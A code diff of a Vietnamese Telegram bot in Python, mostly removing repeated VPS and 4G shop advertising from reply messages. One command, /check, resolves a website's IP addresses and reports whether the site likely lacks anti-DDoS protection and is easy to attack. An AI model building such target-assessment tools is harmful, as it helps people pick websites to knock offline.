+    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')
 
 API_URL = 'https://api.sumiproject.net/checkip?ip='
 
@@ -2575,7 +2056,7 @@ def infoip(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -2585,11 +2066,12 @@ def infoip(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
+
     # Trích xuất nội dung từ tin nhắn
     text = message.text.strip().split(' ')
     if len(text) < 2:
-        bot.reply_to(message, 'Bạn Vui Lòng Nhập checkip < IP Muốn Check >.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        bot.reply_to(message, 'Bạn Vui Lòng Nhập checkip < IP Muốn Check >.')
+
         return
 
     ip_address = text[1]
@@ -2616,14 +2098,11 @@ def infoip(message):
             bot.reply_to(message, info_message, parse_mode='HTML')
 
         else:
-            bot.reply_to(message, f"Không thể lấy dữ liệu từ server. Mã lỗi: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+            bot.reply_to(message, f"Không thể lấy dữ liệu từ server. Mã lỗi: {response.status_code}")
 
     except Exception as e:
         print(str(e))
-        bot.reply_to(message, 'Đã xảy ra lỗi trong quá trình xử lý yêu cầu.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
-
-
-
+        bot.reply_to(message, 'Đã xảy ra lỗi trong quá trình xử lý yêu cầu.')
 
 @bot.message_handler(commands=['check'])
 def check_ip(message):
@@ -2633,7 +2112,7 @@ def check_ip(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -2645,33 +2124,31 @@ def check_ip(message):
         return
     try:
         if len(message.text.split()) != 2:
-            bot.reply_to(message, '>> Vui lòng nhập đúng cú pháp !\nVí dụ: /check + [link website]\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+            bot.reply_to(message, '>> Vui lòng nhập đúng cú pháp !\nVí dụ: /check + [link website]')
+
             return
 
         url = message.text.split()[1]
-        
+
         # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
         if not url.startswith(("http://", "https://")):
             url = "http://" + url
 
         # Loại bỏ tiền tố "www" nếu có
         url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
-        
+
         ip_list = socket.gethostbyname_ex(url)[2]
         ip_count = len(ip_list)
 
         reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
         if ip_count == 1:
-            reply += "Website có 1 ip có khả năng không Antiddos🔒\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click"
+            reply += "Website có 1 ip có khả năng không Antiddos🔒\n"
         else:
-            reply += "Website có nhiều hơn 1 ip khả năng Antiddos🔒 Cao.\nKhó Có Thể Tấn Công Website này.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click"
+            reply += "Website có nhiều hơn 1 ip khả năng Antiddos🔒 Cao.\nKhó Có Thể Tấn Công Website này.\n"
 
         bot.reply_to(message, reply)
     except Exception as e:
-        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
-
-
-
+        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")
 
 # Danh sách các URL bị chặn
 blocked_weps = ["Httpsvpsvanmanhgaming.click", "4gvpsvanmanhgaming.click", "4Gvpsvanmanhgaming.click", "4gvpsvanmanhgaming.CLICK", "4gvpsvanmanhgaming.cLick", "4GVpsvanmanhgaming.Click", "4GVPSVANMANHGAMING.cick", "4GVPSVANMANHGAMING.Click", "4GVPSVANMANHGAMING.CLICK", "https://4gvpsvanmanhgaming.click", "HTTPS://4gvpsvanmanhgaming.click", "httpsvpsvanmanhgaming.click", "HTTPSVPSVANMANHGAMING.click", "HTTPSVPSVANMANHGAMING.CLICK", "https://httpsvpsvanmanhgaming.click", "Httpsvpsvanmanhgaming.click", "HTTPS://VPSVANMANHGAMING.CLICK", " Httpsvpsvanmanhgaming.click", "https://pandanetwork.click", "pandanetwork.click", "Https://Pandanetwork.click", "Pandanetwork.click", "https://api.sumiproject.net", 'api.sumiproject.net', "Https://api.sumiproject.net", 'Https://Api.sumiproject.net']
@@ -2679,7 +2156,7 @@ blocked_weps = ["Httpsvpsvanmanhgaming.click", "4gvpsvanmanhgaming.click", "4Gvp
 def code(message):
     user_id = message.from_user.id
     user_username = message.from_user.username if message.from_user.username else message.from_user.first_name
-    
+
     if not is_bot_active:
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
@@ -2709,18 +2186,21 @@ def code(message):
 
     # Kiểm tra tính hợp lệ của URL
     if not parsed_url.scheme or not parsed_url.netloc:
-        bot.reply_to(message, f"URL không hợp lệ: {url}. Vui lòng kiểm tra lại.!\n@{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"URL không hợp lệ: {url}. Vui lòng kiểm tra lại.!\n@{user_username}")
+
         return
 
     # Kiểm tra URL có nằm trong danh sách bị chặn không
     if any(blocked_wep in url.lower() for blocked_wep in blocked_weps):
-        bot.reply_to(message, f"Không được phép lấy code web này: {url}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"Không được phép lấy code web này: {url}")
+
         return
 
     try:
         response = requests.get(url, timeout=10)
         if response.status_code != 200:
-            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL !\n@{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL !\n@{user_username}')
+
             return
 
         content_type = response.headers.get('content-type', '').split(';')[0]
@@ -2737,22 +2217,18 @@ def code(message):
         zip_file.seek(0)
         bot.send_chat_action(message.chat.id, 'upload_document')
         bot.send_document(
-            message.chat.id, 
-            zip_file, 
-            caption=f"Dưới đây là mã nguồn bạn yêu cầu.:> @{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click"
+            message.chat.id,
+            zip_file,
+            caption=f"Dưới đây là mã nguồn bạn yêu cầu.:> @{user_username}\n"
         )
 
     except requests.exceptions.RequestException as e:
         error_message = str(e)
         if "NameResolutionError" in error_message:
-            bot.reply_to(message, 'Link Wep Đâu Rồi Cu:>@{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+            bot.reply_to(message, 'Link Wep Đâu Rồi Cu:>@{user_username}')
+
         else:
-            bot.reply_to(message, f'Có lỗi xảy ra: {error_message}@{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
-
-
-
-
-
+            bot.reply_to(message, f'Có lỗi xảy ra: {error_message}@{user_username}')
 
 @bot.message_handler(commands=['kiemtra'])
 def check_domain(message):
@@ -2762,7 +2238,7 @@ def check_domain(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -2775,41 +2251,39 @@ def check_domain(message):
 
     # Lấy tên người gửi
     user_username = message.from_user.username if message.from_user.username else message.from_user.first_name
-    
+
     # Lấy tên miền từ tin nhắn
     domain = message.text.replace("/kiemtra", "").strip()
-    
+
     # Kiểm tra xem đã cung cấp tên miền chưa
     if not domain:
-        bot.reply_to(message, f"Vui lòng nhập tên miền, @{user_username}!\nVí dụ: /kiemtra example.com\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"Vui lòng nhập tên miền, @{user_username}!\nVí dụ: /kiemtra example.com")
         return
-    
+
     # Kiểm tra và chuẩn hóa URL
     parsed_url = urlparse(domain)
     if not parsed_url.scheme:
         domain = 'http://' + domain
         parsed_url = urlparse(domain)
-    
+
     # Kiểm tra URL có hợp lệ không
     if not parsed_url.netloc:
-        bot.reply_to(message, f"URL không hợp lệ, @{user_username}. Vui lòng kiểm tra lại!\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"URL không hợp lệ, @{user_username}. Vui lòng kiểm tra lại!")
         return
 
     # Thực hiện truy vấn WHOIS
     try:
         w = whois.whois(parsed_url.netloc)
         if w.domain_name:
-            bot.reply_to(message, f"Tên miền {parsed_url.netloc} đã được đăng ký, @{user_username}.\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+            bot.reply_to(message, f"Tên miền {parsed_url.netloc} đã được đăng ký, @{user_username}.")
         else:
-            bot.reply_to(message, f"Tên miền {parsed_url.netloc} chưa được đăng ký, @{user_username}.\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+            bot.reply_to(message, f"Tên miền {parsed_url.netloc} chưa được đăng ký, @{user_username}.")
     except whois.parser.PywhoisError:
-        bot.reply_to(message, f"Tên miền {parsed_url.netloc} chưa được đăng ký, @{user_username}.\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"Tên miền {parsed_url.netloc} chưa được đăng ký, @{user_username}.")
     except socket.gaierror:
-        bot.reply_to(message, f"Có lỗi xảy ra khi kết nối đến máy chủ WHOIS, @{user_username}. Vui lòng thử lại sau.\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"Có lỗi xảy ra khi kết nối đến máy chủ WHOIS, @{user_username}. Vui lòng thử lại sau.")
     except Exception as e:
-        bot.reply_to(message, f"Có lỗi xảy ra, @{user_username}: {str(e)}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
-
-
+        bot.reply_to(message, f"Có lỗi xảy ra, @{user_username}: {str(e)}")
 
 @bot.message_handler(commands=['admin1'])
 def admin_info(message):
@@ -2826,8 +2300,6 @@ def admin_info(message):
     admin1_message = (
         "<b>🌟 Thông Tin Liên Hệ Của Admin1 🌟</b>\n\n"
         f"<b>🔹 Facebook:</b> <a href='{web2_url}'>Xem Hồ Sơ</a>\n"
-        f"<b>🔹 Cho Thuê VPS Giá Rẻ:</b> <a href='{fb2_box}'>Xem Chi Tiết</a>\n"
-        f"<b>🔹 Shop 4G💳💲:</b> <a href='{shop_4g}'>Mua Ngay</a>\n"
         f"<b>🔹 Tiktok:</b> <a href='{tiktok2_url}'>Xem Video</a>\n"
         f"<b>🔹 Youtube Chính:</b> <a href='{youtube3_url}'>Theo Dõi</a>\n"
         f"<b>🔹 Youtube Phụ:</b> <a href='{youtube2_url}'>Theo Dõi</a>\n"
@@ -2843,37 +2315,11 @@ def admin_info(message):
         "<b>🔗 LINK TLE ĐỂ THUÊ:</b> <a href='https://t.me/Vpsvanmanhgaming'>Liên Hệ</a>\n"
         "<b>🌟 NHÓM TLE GIAO LƯU:</b> <a href='https://t.me/botvipvc'>Tham Gia</a>\n"
         "<b>🌟 NHÓM TLE GIAO LƯU KHÁC:</b> <a href='https://t.me/botvipfc'>Tham Gia</a>\n"
-        "<b>🚀 Admin Cung Cấp Dịch Vụ 4G, 5G VPN Giá Rẻ Nhất 😎✨</b>\n"
-        "<b>🔹 Website VPN:</b> <a href='https://4gvpsvanmanhgaming.click'>Xem Ngay</a>\n"
-        "<b>🔸 Rẻ Nhất Chỉ Từ 7k 💸</b> - Tốc Độ Cực Mạnh, Nhiều GB ⚡\n"
-        "<b>🔸 Rất Nhiều Cổng Mạng, File, Server 🌍</b>\n"
-        "<b>🔸 Cung Cấp Dịch Vụ 4G Tốc Độ Cực Cao 📶💨</b>\n"
-        "<b>🔸 Dịch Vụ VPN Tăng Tốc Mạng, Wifi 🔧🌐</b>\n"
-        "<b>🔸 Hệ Thống Máy Chủ Cao Cấp 🖥️🔒</b>\n"
-        "<b>🔸 'Ngon - Bổ - Rẻ' 😋💯</b>\n"
-        "<b>🔸 Làm CTV Web Con 40% 💼📈</b>\n"
-        "<b>🔸 Trải Nghiệm Mượt Mà Nhất 🎬🎮🖥️</b>\n"
-        "<b>👉 Copyright 2024 © Powered By <a href='https://4gvpsvanmanhgaming.click'>4GVPS</a> 👈</b>"
+        ""
     )
     bot.reply_to(message, admin1_message, parse_mode='HTML')
     bot.reply_to(message, help_text, parse_mode='HTML')
     bot.send_video(message.chat.id, video_url, caption="<b>🎥 Video Giới Thiệu Dịch Vụ 4G Giá Rẻ Nha:</b>", parse_mode='HTML')
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 @bot.message_handler(commands=['admin2'])
 def admin_info(message):
@@ -2888,7 +2334,7 @@ def admin_info(message):
         return
 
     # Thay thế các giá trị sau bằng thông tin liên hệ của bạn
-    admin2_message = (f'''
+    admin2_message = f'''
 📄 Admin Information2\n\n
 <b>Telegram</b>: @Selphy_ExE\n
 <b>Facebook</b>: Vu Hai Lam\n
@@ -2898,16 +2344,9 @@ def admin_info(message):
 <b>Website2</b>: <code>Api.PandaNetwork.Click</code>\n
 <b>🩷 Admin Gửi Đôi Lời:</b> <i>Anh yêu em như củ khoai nang mà em lại đi theo thằng lang thang</i>\n
 
-
-
-        ''')
+        '''
 
     bot.reply_to(message, admin2_message, parse_mode='HTML')
-
-
-
-
-
 
 def get_elapsed_time():
     elapsed_time = time.time() - start_time
@@ -2927,7 +2366,7 @@ def send_time(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -2937,26 +2376,21 @@ def send_time(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
+
     user_id = message.from_user.id
     if user_id not in ADMIN_ID:
-        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này. \n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này. ')
+
         return
 
     elapsed_time = get_elapsed_time()
     banner_image = get_banner_image(elapsed_time)
-    
+
     bot.send_photo(
         message.chat.id,
         banner_image,
-        caption=f"[❄️]~~~>TIME<~~~[❄️]\nBot đã hoạt động được[{20}]\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click"
+        caption=f"[❄️]~~~>TIME<~~~[❄️]\nBot đã hoạt động được[{20}]\n"
     )
-
-
-
-
-
-
 
 @bot.message_handler(func=lambda message: message.text.startswith('/'))
 def invalid_command(message):
@@ -2976,7 +2410,6 @@ def invalid_command(message):
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
 
-    bot.reply_to(message, '⚠️ Lệnh không hợp lệ, Vui lòng sử dụng lệnh /start để xem danh sách lệnh !\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
+    bot.reply_to(message, '⚠️ Lệnh không hợp lệ, Vui lòng sử dụng lệnh /start để xem danh sách lệnh !\n')
 
 bot.infinity_polling(timeout=60, long_polling_timeout = 1)
-
